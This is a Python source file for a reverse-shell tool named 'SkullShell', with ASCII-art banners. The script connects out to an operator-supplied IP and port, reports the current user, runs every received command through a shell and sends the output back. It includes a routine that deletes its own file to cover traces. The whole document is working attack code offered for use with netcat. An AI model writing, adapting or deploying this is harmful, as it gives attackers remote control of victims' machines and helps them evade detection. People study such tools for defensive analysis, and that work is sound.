import socket
import os
import subprocess
from sys import argv
import time
#SUDO DOES NOT WORK PROPERLY!!!!

from colorama import init, Fore

init(autoreset=True)
PORT = 1234 #Change me 

ascii_art1 = '''
 ______   __                  __  __   ______   __                  __  __
 /      \\ /  |                /  |/  | /      \\ /  |                /  |/  |
/$$$$$$  |$$ |   __  __    __ $$ |$$ |/$$$$$$  |$$ |____    ______  $$ |$$ |
$$ \\__$$/ $$ |  /  |/  |  /  |$$ |$$ |$$ \\__$$/ $$      \\  /      \\ $$ |$$ |
$$      \\ $$ |_/$$/ $$ |  $$ |$$ |$$ |$$      \\ $$$$$$$  |/$$$$$$  |$$ |$$ |
 $$$$$$  |$$   $$<  $$ |  $$ |$$ |$$ | $$$$$$  |$$ |  $$ |$$    $$ |$$ |$$ |
/  \\__$$ |$$$$$$  \\ $$ \\__$$ |$$ |$$ |/  \\__$$ |$$ |  $$ |$$$$$$$$/ $$ |$$ |
$$    $$// $$ | $$  |$$    $$/ $$ |$$ |$$    $$/ $$ |  $$ |$$       |$$ |$$ |
 $$$$$$/  $$/   $$/  $$$$$$/  $$/ $$/  $$$$$$/  $$/   $$/  $$$$$$$/ $$/ $$/ 
'''
ascii_art2 ='''         .AMMMMMMMMMMA.          
       .AV. :::.:.:.::MA.        
      A' :..        : .:`A       
     A'..              . `A.     
    A' :.    :::::::::  : :`A    
    M  .    :::.:.:.:::  . .M    
    M  :   ::.:.....::.:   .M    
    V : :.::.:........:.:  :V    
   A  A:    ..:...:...:.   A A   
  .V  MA:.....:M.::.::. .:AM.M   
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A  
:M .  .`VMMMMMMV.:A `VMMMMV .:M: 
 V.:.  ..`VMMMV.:AM..`VMV' .: V  
  V.  .:. .....:AMMA. . .:. .V   
   VMM...: ...:.MMMM.: .: MMV    
       `VM: . ..M.:M..:::M'      
         `M::. .:.... .::M       
          M:.  :. .... ..M       
 VK       V:  M:. M. :M .V       
          `V.:M.. M. :M.V'''

host = input(Fore.RED+"Enter IP >> ")
connected = False
def initiate():
    global connected,sock
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error as error:
        print(Fore.RED+f"[!]: {error}") 
        killhost()
    
    while(connected == False):
        time.sleep(2)
        try:
            sock.connect((host,PORT))
            connected=True
        except:
            time.sleep(10)
            pass
    
    print(Fore.GREEN+"[+]: Connection Accepted") 
    id =  subprocess.getoutput("id").encode()

    sock.send(b"\n###################\n###################\n###################\n###################\nREVERSE SHELL\n\n\nUSE WITH NETCAT OR YOUR OWN LISTENER\n\n\n"+ b"Type kill, to kill host connection\n")
    sock.send(b"CURRENT USER:\n" + id + b"\n\n")
        
        

def killhost(debugmode=True):
    if(debugmode==False):
        sock.close()
        os.remove(argv[0])
        
def Process():
    global sock,message
    try:
        message = sock.recv(2048).decode()
        Handler() 
    except socket.error as e:
        print(e)
        killhost()  
    


def Handler():
    if "kill" in message:
        sock.send(b"Terminating Shell:\n")
        killhost()
    if "cd " in message:
        _, target_dir = message.split("cd ", 1)
        target_dir = target_dir.strip()
        try:
            os.chdir(target_dir)
        except Exception as e:
            sock.send(str(e).encode())
    else:
        try:
            output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
            sock.send(output)     
        except subprocess.CalledProcessError as e:
            sock.send(str(e).encode() +subprocess.getoutput(message).encode())
        


if __name__ == "__main__":
    global sock
    print(Fore.RED + "\n\n"+ascii_art1+"\n\n" + ascii_art2+"\n\n"+ "Starting SkullShell...")
    initiate()
    while True:
        Process()


        